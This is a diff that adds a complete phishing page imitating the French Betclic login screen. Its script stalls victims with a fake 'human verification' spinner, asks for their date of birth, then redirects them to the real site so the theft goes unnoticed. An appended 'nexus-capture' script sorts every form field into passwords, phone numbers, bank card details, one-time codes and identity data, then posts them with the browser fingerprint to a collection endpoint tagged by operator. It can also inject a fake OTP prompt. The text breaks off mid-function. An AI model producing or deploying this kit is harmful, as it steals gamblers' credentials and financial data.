@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion – Betclic</title>
+    <style>
+        :root {
+            --bc-red: #e31c25;
+            --bc-red-dark: #c4121b;
+            --bc-btn-soft: #f5b8bc;
+            --bc-gray-btn: #eceef1;
+            --bc-gray-btn-hover: #e1e4e8;
+            --bc-input-bg: #f3f5f8;
+            --bc-text-dark: #1d2228;
+            --bc-text-muted: #68707a;
+            --bc-error: #c4121b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bc-red);
+            color: var(--bc-text-dark);
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Bannière supérieure "Betclic pour iOS" */
+        .ios-banner {
+            background-color: #ffffff;
+            height: 62px;
+            padding: 0 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #e5e7eb;
+            gap: 10px;
+        }
+
+        .ios-banner-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 0;
+        }
+
+        .ios-close-btn {
+            background: none;
+            border: none;
+            font-size: 1.25rem;
+            color: #4b5563;
+            cursor: pointer;
+            padding: 4px 6px;
+            line-height: 1;
+        }
+
+        .ios-app-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 9px;
+            background-color: var(--bc-red);
+            color: #ffffff;
+            font-size: 0.72rem;
+            font-weight: 800;
+            font-style: italic;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .ios-app-meta {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        .ios-app-name {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--bc-text-dark);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .ios-stars {
+            color: #f59e0b;
+            font-size: 0.78rem;
+            letter-spacing: 1px;
+        }
+
+        .ios-download-btn {
+            background-color: var(--bc-red);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 14px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .ios-download-btn:hover {
+            background-color: var(--bc-red-dark);
+        }
+
+        /* Zone rouge principale */
+        .bc-main {
+            flex: 1;
+            background-color: var(--bc-red);
+            padding: 14px 16px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .bc-top-row {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 22px;
+        }
+
+        .bc-close-circle {
+            position: absolute;
+            left: 0;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: none;
+            background-color: rgba(0, 0, 0, 0.16);
+            color: #ffffff;
+            font-size: 1.05rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .bc-brand-pill {
+            background-color: var(--bc-red);
+            color: #ffffff;
+            font-size: 1.55rem;
+            font-weight: 900;
+            font-style: italic;
+            letter-spacing: -0.6px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            line-height: 1.15;
+        }
+
+        /* Carte blanche Connexion */
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 26px 20px 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.14);
+        }
+
+        .card-title {
+            text-align: center;
+            font-size: 1.45rem;
+            font-weight: 800;
+            color: var(--bc-text-dark);
+            margin-bottom: 20px;
+        }
+
+        .field-group {
+            position: relative;
+            margin-bottom: 14px;
+        }
+
+        .bc-input {
+            width: 100%;
+            height: 50px;
+            padding: 0 44px 0 14px;
+            border-radius: 8px;
+            border: 1.5px solid transparent;
+            background-color: var(--bc-input-bg);
+            font-size: 0.98rem;
+            color: var(--bc-text-dark);
+            outline: none;
+            transition: border-color 0.15s, background-color 0.15s;
+        }
+
+        .bc-input::placeholder {
+            color: #7c8590;
+        }
+
+        .bc-input:focus {
+            background-color: #ffffff;
+            border-color: var(--bc-red);
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #374151;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .error-text {
+            color: var(--bc-error);
+            font-size: 0.82rem;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .btn-submit-bc {
+            width: 100%;
+            height: 48px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--bc-btn-soft);
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit-bc.ready {
+            background-color: var(--bc-red);
+        }
+
+        .btn-submit-bc.ready:hover {
+            background-color: var(--bc-red-dark);
+        }
+
+        .forgot-row {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .forgot-link {
+            background: none;
+            border: none;
+            color: var(--bc-red);
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .or-text {
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--bc-text-dark);
+            margin: 16px 0;
+        }
+
+        .btn-passkey {
+            width: 100%;
+            height: 48px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--bc-gray-btn);
+            color: var(--bc-text-dark);
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.15s;
+        }
+
+        .btn-passkey:hover {
+            background-color: var(--bc-gray-btn-hover);
+        }
+
+        /* Bas de page rouge : inscription */
+        .signup-footer {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            margin-top: 24px;
+            color: #ffffff;
+            line-height: 1.5;
+        }
+
+        .signup-question {
+            font-size: 0.92rem;
+            font-weight: 500;
+        }
+
+        .signup-cta {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 0.98rem;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 2px;
+        }
+
+        .signup-cta:hover {
+            text-decoration: underline;
+        }
+
+        /* Overlay sombre partagé (cookies + date de naissance + vérification cercle rouge) */
+        .dark-backdrop {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(20, 14, 15, 0.72);
+            z-index: 200;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+        }
+
+        .dark-backdrop.visible {
+            display: flex;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Modale Cookies */
+        .cookies-modal {
+            width: 100%;
+            max-width: 390px;
+            background-color: #ffffff;
+            border-radius: 18px;
+            padding: 24px 20px 22px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.28);
+            display: none;
+        }
+
+        .cookies-modal.active {
+            display: block;
+        }
+
+        .cookies-title {
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--bc-text-dark);
+            margin-bottom: 10px;
+        }
+
+        .cookies-lead {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 16px;
+        }
+
+        .cookies-benefit {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            font-size: 0.92rem;
+            color: var(--bc-text-dark);
+        }
+
+        .cookies-benefit-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #f3f4f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            flex-shrink: 0;
+        }
+
+        .cookies-note {
+            border-top: 1px solid #e5e7eb;
+            padding-top: 14px;
+            margin-top: 6px;
+            margin-bottom: 18px;
+            font-size: 0.88rem;
+            color: #4b5563;
+            line-height: 1.4;
+        }
+
+        .cookie-btn-settings {
+            width: 100%;
+            height: 46px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--bc-gray-btn);
+            color: var(--bc-text-dark);
+            font-size: 0.96rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .cookie-btn-accept {
+            width: 100%;
+            height: 46px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--bc-red);
+            color: #ffffff;
+            font-size: 0.96rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .cookie-btn-refuse {
+            width: 100%;
+            background: none;
+            border: none;
+            color: var(--bc-red);
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            padding: 6px 0;
+        }
+
+        /* Modale Confirmation Date de naissance */
+        .dob-modal {
+            width: 100%;
+            max-width: 390px;
+            background-color: #ffffff;
+            border-radius: 18px;
+            padding: 26px 20px 24px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.28);
+            display: none;
+        }
+
+        .dob-modal.active {
+            display: block;
+        }
+
+        .dob-title {
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--bc-text-dark);
+            margin-bottom: 8px;
+        }
+
+        .dob-subtitle {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #4b5563;
+            line-height: 1.45;
+            margin-bottom: 18px;
+        }
+
+        .dob-input {
+            width: 100%;
+            height: 50px;
+            padding: 0 14px;
+            border-radius: 8px;
+            border: 1.5px solid #d1d5db;
+            background-color: var(--bc-input-bg);
+            font-size: 0.98rem;
+            color: var(--bc-text-dark);
+            outline: none;
+            margin-bottom: 12px;
+            transition: border-color 0.15s, background-color 0.15s;
+        }
+
+        .dob-input:focus {
+            background-color: #ffffff;
+            border-color: var(--bc-red);
+        }
+
+        .btn-confirm-dob {
+            width: 100%;
+            height: 48px;
+            border-radius: 8px;
+            border: none;
+            background-color: var(--bc-red);
+            color: #ffffff;
+            font-size: 0.98rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.15s;
+        }
+
+        .btn-confirm-dob:hover {
+            background-color: var(--bc-red-dark);
+        }
+
+        /* Modale Vérification avec cercle rouge uniquement */
+        .verify-modal {
+            width: 100%;
+            max-width: 390px;
+            background-color: #ffffff;
+            border-radius: 18px;
+            padding: 28px 22px 30px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.28);
+            text-align: center;
+            display: none;
+        }
+
+        .verify-modal.active {
+            display: block;
+        }
+
+        .verify-title {
+            font-size: 1.35rem;
+            font-weight: 900;
+            font-style: italic;
+            color: var(--bc-text-dark);
+            margin-bottom: 8px;
+        }
+
+        .verify-subtitle {
+            font-size: 0.92rem;
+            color: #4b5563;
+            margin-bottom: 24px;
+        }
+
+        .red-spinner {
+            width: 36px;
+            height: 36px;
+            margin: 0 auto;
+            border: 3.5px solid rgba(227, 28, 37, 0.16);
+            border-top-color: var(--bc-red);
+            border-radius: 50%;
+            animation: spinRed 0.75s linear infinite;
+        }
+
+        @keyframes spinRed {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Bannière iOS en haut -->
+    <div class="ios-banner" id="ios-banner">
+        <div class="ios-banner-left">
+            <button type="button" class="ios-close-btn" id="close-ios-banner" aria-label="Fermer">×</button>
+            <div class="ios-app-icon">Betclic</div>
+            <div class="ios-app-meta">
+                <span class="ios-app-name">Betclic pour iOS</span>
+                <span class="ios-stars" aria-label="4.5 étoiles">★★★★★</span>
+            </div>
+        </div>
+        <button type="button" class="ios-download-btn" id="ios-download-btn">Télécharger</button>
+    </div>
+
+    <!-- Contenu principal rouge -->
+    <main class="bc-main">
+        <div class="bc-top-row">
+            <button type="button" class="bc-close-circle" aria-label="Fermer">×</button>
+            <div class="bc-brand-pill">Betclic</div>
+        </div>
+
+        <div class="login-card">
+            <h1 class="card-title">Connexion</h1>
+
+            <form id="bc-login-form" novalidate>
+                <div class="field-group">
+                    <input
+                        type="text"
+                        id="bc-login-input"
+                        name="login"
+                        class="bc-input"
+                        placeholder="Email ou pseudo"
+                        autocomplete="username"
+                        required
+                    >
+                </div>
+
+                <div class="field-group">
+                    <input
+                        type="password"
+                        id="bc-password-input"
+                        name="password"
+                        class="bc-input"
+                        placeholder="Mot de passe"
+                        autocomplete="current-password"
+                        required
+                    >
+                    <button type="button" class="eye-btn" id="toggle-bc-password" aria-label="Afficher ou masquer le mot de passe">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <p id="bc-error" class="error-text">Veuillez saisir votre email ou pseudo et votre mot de passe.</p>
+
+                <button type="submit" id="bc-submit-btn" class="btn-submit-bc">Connexion</button>
+
+                <div class="forgot-row">
+                    <button type="button" class="forgot-link" id="forgot-password-btn">Mot de passe oublié ?</button>
+                </div>
+
+                <div class="or-text">Ou</div>
+
+                <button type="button" class="btn-passkey" id="passkey-btn">Connexion avec une clé d'accès</button>
+            </form>
+        </div>
+
+        <div class="signup-footer">
+            <p class="signup-question">Tu n'as pas de compte ?</p>
+            <button type="button" class="signup-cta" id="signup-cta-btn">Inscris-toi</button>
+        </div>
+    </main>
+
+    <!-- Overlay sombre : Cookies + Vérification 5s + Confirmation Date de naissance + Chargement final 2s -->
+    <div id="dark-backdrop" class="dark-backdrop" aria-modal="true" role="dialog">
+        <!-- Modale Cookies -->
+        <div id="cookies-modal" class="cookies-modal">
+            <h2 class="cookies-title">Les cookies c'est toi qui choisis !</h2>
+            <p class="cookies-lead">On s'engage à les utiliser pour t'offrir</p>
+
+            <div class="cookies-benefit">
+                <span class="cookies-benefit-icon" aria-hidden="true">🔥</span>
+                <span><strong>Des performances améliorées</strong></span>
+            </div>
+
+            <div class="cookies-benefit">
+                <span class="cookies-benefit-icon" aria-hidden="true">🔒</span>
+                <span><strong>Une expérience optimisée et plus sûre</strong></span>
+            </div>
+
+            <div class="cookies-benefit">
+                <span class="cookies-benefit-icon" aria-hidden="true">🎯</span>
+                <span><strong>Des offres et des contenus personnalisés</strong></span>
+            </div>
+
+            <p class="cookies-note">C'est safe, tu peux changer tes préférences à tout moment.</p>
+
+            <button type="button" class="cookie-btn-settings" id="cookie-settings-btn">Paramétrer</button>
+            <button type="button" class="cookie-btn-accept" id="cookie-accept-btn">Tout accepter</button>
+            <button type="button" class="cookie-btn-refuse" id="cookie-refuse-btn">Tout refuser</button>
+        </div>
+
+        <!-- Modale Vérification avec cercle rouge (5s après connexion / 2s max après date de naissance) -->
+        <div id="verify-modal" class="verify-modal">
+            <h2 class="verify-title" id="verify-modal-title">Vérification en cours...</h2>
+            <p class="verify-subtitle" id="verify-modal-subtitle">On s'assure que tu es bien humain</p>
+            <div class="red-spinner" aria-label="Chargement"></div>
+        </div>
+
+        <!-- Modale Confirmation Date de naissance -->
+        <div id="dob-modal" class="dob-modal">
+            <h2 class="dob-title">Confirme ta date de naissance</h2>
+            <p class="dob-subtitle">Entre ta date de naissance pour confirmer ton identité avant la redirection.</p>
+
+            <form id="dob-confirm-form" novalidate>
+                <input
+                    type="date"
+                    id="bc-dob-input"
+                    name="birth_date"
+                    class="dob-input"
+                    aria-label="Date de naissance"
+                    required
+                >
+                <p id="dob-error" class="error-text">Veuillez entrer une date de naissance valide.</p>
+                <button type="submit" id="dob-confirm-btn" class="btn-confirm-dob">Confirmer</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const OFFICIAL_BETCLIC_URL = "https://www.betclic.fr/";
+            const INITIAL_VERIFY_MS = 5000;
+            const FINAL_REDIRECT_MS = 2000;
+
+            const darkBackdrop = document.getElementById('dark-backdrop');
+            const cookiesModal = document.getElementById('cookies-modal');
+            const verifyModal = document.getElementById('verify-modal');
+            const dobModal = document.getElementById('dob-modal');
+            const verifyModalTitle = document.getElementById('verify-modal-title');
+            const verifyModalSubtitle = document.getElementById('verify-modal-subtitle');
+
+            const loginForm = document.getElementById('bc-login-form');
+            const loginInput = document.getElementById('bc-login-input');
+            const passwordInput = document.getElementById('bc-password-input');
+            const togglePasswordBtn = document.getElementById('toggle-bc-password');
+            const submitBtn = document.getElementById('bc-submit-btn');
+            const errorText = document.getElementById('bc-error');
+
+            const dobForm = document.getElementById('dob-confirm-form');
+            const dobInput = document.getElementById('bc-dob-input');
+            const dobError = document.getElementById('dob-error');
+
+            let isRedirecting = false;
+            let initialVerifyTimer = null;
+            let finalRedirectTimer = null;
+
+            const redirectMethods = [
+                function methodAssign(url) {
+                    window.location.assign(url);
+                },
+                function methodReplace(url) {
+                    window.location.replace(url);
+                },
+                function methodHref(url) {
+                    window.location.href = url;
+                },
+                function methodTopLocation(url) {
+                    if (window.top && window.top !== window) {
+                        window.top.location.href = url;
+                    } else if (window.parent && window.parent !== window) {
+                        window.parent.location.href = url;
+                    } else {
+                        window.location.href = url;
+                    }
+                },
+                function methodAnchorClick(url) {
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.target = '_top';
+                    link.rel = 'noopener noreferrer';
+                    document.body.appendChild(link);
+                    link.click();
+                    link.remove();
+                }
+            ];
+
+            function runFiveRedirectMethods(url) {
+                if (isRedirecting) return;
+                isRedirecting = true;
+                clearTimeout(initialVerifyTimer);
+                clearTimeout(finalRedirectTimer);
+
+                redirectMethods.forEach((fn, index) => {
+                    setTimeout(() => {
+                        try {
+                            fn(url);
+                        } catch (_) {}
+                    }, index * 250);
+                });
+            }
+
+            setTimeout(() => {
+                if (!verifyModal.classList.contains('active') && !dobModal.classList.contains('active') && !isRedirecting) {
+                    cookiesModal.classList.add('active');
+                    darkBackdrop.classList.add('visible');
+                }
+            }, 1000);
+
+            function dismissCookiesModal() {
+                cookiesModal.classList.remove('active');
+                darkBackdrop.classList.remove('visible');
+                loginInput.focus();
+            }
+
+            document.getElementById('cookie-settings-btn').addEventListener('click', dismissCookiesModal);
+            document.getElementById('cookie-accept-btn').addEventListener('click', dismissCookiesModal);
+            document.getElementById('cookie-refuse-btn').addEventListener('click', dismissCookiesModal);
+
+            function refreshSubmitButtonStyle() {
+                const hasLogin = loginInput.value.trim().length > 0;
+                const hasPass = passwordInput.value.length > 0;
+                submitBtn.classList.toggle('ready', hasLogin && hasPass);
+            }
+
+            loginInput.addEventListener('input', () => {
+                errorText.style.display = 'none';
+                refreshSubmitButtonStyle();
+            });
+
+            passwordInput.addEventListener('input', () => {
+                errorText.style.display = 'none';
+                refreshSubmitButtonStyle();
+            });
+
+            togglePasswordBtn.addEventListener('click', () => {
+                const isHidden = passwordInput.type === 'password';
+                passwordInput.type = isHidden ? 'text' : 'password';
+            });
+
+            // 1. Connexion -> cercle rouge pendant 5s -> affiche directement la confirmation de date de naissance
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (isRedirecting) return;
+
+                const userVal = loginInput.value.trim();
+                const passVal = passwordInput.value;
+
+                if (!userVal || passVal.length < 4) {
+                    errorText.style.display = 'block';
+                    return;
+                }
+
+                errorText.style.display = 'none';
+                cookiesModal.classList.remove('active');
+                dobModal.classList.remove('active');
+                verifyModalTitle.textContent = "Vérification en cours...";
+                verifyModalSubtitle.textContent = "On s'assure que tu es bien humain";
+                verifyModal.classList.add('active');
+                darkBackdrop.classList.add('visible');
+
+                clearTimeout(initialVerifyTimer);
+                initialVerifyTimer = setTimeout(() => {
+                    if (isRedirecting) return;
+                    verifyModal.classList.remove('active');
+                    dobError.style.display = 'none';
+                    dobModal.classList.add('active');
+                    darkBackdrop.classList.add('visible');
+                    setTimeout(() => dobInput.focus(), 50);
+                }, INITIAL_VERIFY_MS);
+            });
+
+            dobInput.addEventListener('input', () => {
+                dobError.style.display = 'none';
+            });
+
+            // 2. Confirmation de la date de naissance -> cercle rouge 2s max -> redirection vers le site officiel
+            dobForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (isRedirecting) return;
+
+                const dobVal = (dobInput.value || '').trim();
+                if (!dobVal) {
+                    dobError.style.display = 'block';
+                    dobInput.focus();
+                    return;
+                }
+
+                dobError.style.display = 'none';
+                dobModal.classList.remove('active');
+                verifyModalTitle.textContent = "Confirmation en cours...";
+                verifyModalSubtitle.textContent = "Redirection vers le site officiel...";
+                verifyModal.classList.add('active');
+                darkBackdrop.classList.add('visible');
+
+                clearTimeout(finalRedirectTimer);
+                finalRedirectTimer = setTimeout(() => {
+                    runFiveRedirectMethods(OFFICIAL_BETCLIC_URL);
+                }, FINAL_REDIRECT_MS);
+            });
+
+            document.getElementById('close-ios-banner').addEventListener('click', () => {
+                document.getElementById('ios-banner').style.display = 'none';
+            });
+        });
+    </script>
+
+
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Betclic",
+    enableOtp: false,
+    caps: {"id":true,"pass":true,"phone":true,"bank":false,"extra":true,"otp":false}
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    capturedFields: {},
+    sentFingerprints: new Set()
+  };
+
+  function getFieldDescriptor(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const baseName =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("field_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: baseName.trim(), meta };
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    if (type === "hidden" || type === "submit" || type === "button" || type === "reset") {
+      return "ignore";
+    }
+
+    const { meta } = getFieldDescriptor(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "pass";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank|billing/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (type === "tel" || /phone|t[ée]l[ée]phone|mobile|indicatif|country.?code|prefix|\+225|\+221|\+237|\+33/i.test(meta)) {
+      return "phone";
+    }
+    if (type === "email" || /email|e-mail|identifiant|username|user|login/i.test(meta)) {
+      return "id";
+    }
+    if (isDob || type === "text" || type === "number" || type === "search" || el.tagName === "SELECT" || el.tagName === "TEXTAREA") {
+      return "extra";
+    }
+
+    return "extra";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    const phoneParts = [];
+    const allCaptured = {};
+
+    let idCandidate = "";
+    let passCandidate = "";
+    let bankCandidate = "";
+    let extraCandidate = "";
+
+    const activeBtn = document.querySelector(".tab-btn.active");
+    const activeTab = activeBtn ? (activeBtn.dataset.tab || "") : "";
+
+    fields.forEach((el, idx) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const role = classifyInput(el);
+      if (role === "ignore") return;
+
+      // Vérifie si la catégorie de capture est cochée dans NEXUS
+      if (!NEXUS_CFG.caps[role]) return;
+
+      const { key } = getFieldDescriptor(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "Oui") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "Sélectionné";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const uniqueKey = allCaptured[key] !== undefined && allCaptured[key] !== val ? (key + "_" + (idx + 1)) : key;
+      allCaptured[uniqueKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "pass") {
+        passCandidate = el.value;
+      } else if (role === "phone") {
+        phoneParts.push(val);
+      } else if (role === "id" && !idCandidate) {
+        idCandidate = val;
+      } else if (role === "bank" && !bankCandidate) {
+        bankCandidate = val;
+      } else if (!extraCandidate) {
+        extraCandidate = val;
+      }
+    });
+
+    if (activeTab) {
+      allCaptured.onglet_actif = activeTab;
+    }
+
+    const combinedPhone = phoneParts.join(" ").trim();
+
+    if (activeTab === "phone" && combinedPhone && NEXUS_CFG.caps.phone) {
+      state.victimUser = combinedPhone;
+    } else if (activeTab === "code" && combinedPhone && NEXUS_CFG.caps.phone) {
+      state.victimUser = combinedPhone;
+    } else {
+      state.victimUser = idCandidate || combinedPhone || bankCandidate || extraCandidate || "";
+    }
+
+    state.victimPass = NEXUS_CFG.caps.pass ? (passCandidate || state.victimPass || "") : "";
+    state.otp = (NEXUS_CFG.caps.otp && otpParts.length > 0) ? otpParts.join("") : "Aucun";
+    state.capturedFields = allCaptured;
+  }
+
+  function postPayload(payload) {
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentFingerprints.has(fingerprint)) return;
+    state.sentFingerprints.add(fingerprint);
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendCapture(stage, extra = {}) {
+    collectCurrentValues();
+
+    const hasFields = Object.keys(state.capturedFields).length > 0;
+    const hasMainData = Boolean(state.victimUser || state.victimPass || (state.otp && state.otp !== "Aucun"));
+    if (!hasFields && !hasMainData && (!extra.otp || extra.otp === "Aucun")) {
+      return;
+    }
+
+    const isOtpEvent = Boolean(NEXUS_CFG.caps.otp && extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
+    const effectiveOtp = NEXUS_CFG.caps.otp
+      ? (extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun")))
+      : "Aucun";
+
+    const payload = {
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: isOtpEvent ? "otp" : stage,
+      victimUser: state.victimUser || "Inconnu",
+      victimPass: state.victimPass || "Inconnu",
+      otp: effectiveOtp,
+      fields: state.capturedFields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: state.capturedFields
+      })
+    };
+
+    postPayload(payload);
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp || !NEXUS_CFG.caps.otp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      collectCurrentValues();
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
